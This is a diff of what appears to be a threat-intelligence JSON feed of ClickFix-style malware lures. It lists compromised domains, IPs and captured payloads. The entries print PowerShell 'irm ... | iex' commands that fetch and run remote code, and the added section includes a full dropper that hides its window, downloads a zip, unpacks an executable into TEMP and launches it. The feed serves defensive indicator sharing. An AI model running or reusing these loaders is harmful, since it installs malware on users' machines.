@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "www.nytenymalagasy.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "31.207.34.134"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwxtokrh0fqu0omlscdxk3zw",
+    "ScannedAt": "2026-11-26T17:24:43.995000+00:00"
+  },
+  {
+    "UrlDomain": "bmlh.org",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "66.29.141.224"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwxt8pqd0fpp0omltjnqpdwu",
+    "ScannedAt": "2026-11-26T17:12:23.951000+00:00"
+  },
+  {
     "UrlDomain": "amplaesquadrias.com",
     "DeliveryUrl": [
       "browse-login.info"
@@ -2874,75 +2913,5 @@
     ],
     "ReportId": "cmwv06sn108z90nmllnm9vbl9",
     "ScannedAt": "2026-11-24T18:03:33.186000+00:00"
-  },
-  {
-    "UrlDomain": "www.antalya-flughafen-transfer.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "85.13.155.230"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
-    ],
-    "ReportId": "cmwuz07qy07ym0nml9jk9kcw7",
-    "ScannedAt": "2026-11-24T17:30:26.562000+00:00"
-  },
-  {
-    "UrlDomain": "smartlifedubai.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/click/8117764681afc8de"
-    ],
-    "IP": [
-      "198.38.94.5"
-    ],
-    "Related": [
-      {
-        "Value": "i",
-        "Type": "Hostname"
-      }
-    ],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/8117764681afc8de')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/click/8117764681afc8de"
-    ],
-    "ReportId": "cmwuye3j107k00nmls10wj0uc",
-    "ScannedAt": "2026-11-24T17:13:14.656000+00:00"
-  },
-  {
-    "UrlDomain": "beta.orangelaw.us",
-    "DeliveryUrl": [
-      "img-codes-cloude.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "148.135.128.87"
-    ],
-    "Related": [
-      {
-        "Value": "https://img-codes-cloude.info/c5dee301a82e8e70",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'img-codes-cloude[.]info/c5dee301a82e8e70'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://img-codes-cloude.info/c5dee301a82e8e70"
-    ],
-    "ReportId": "cmwuy1res077h0nmly52hc6wy",
-    "ScannedAt": "2026-11-24T17:03:39.058000+00:00"
   }
 ]
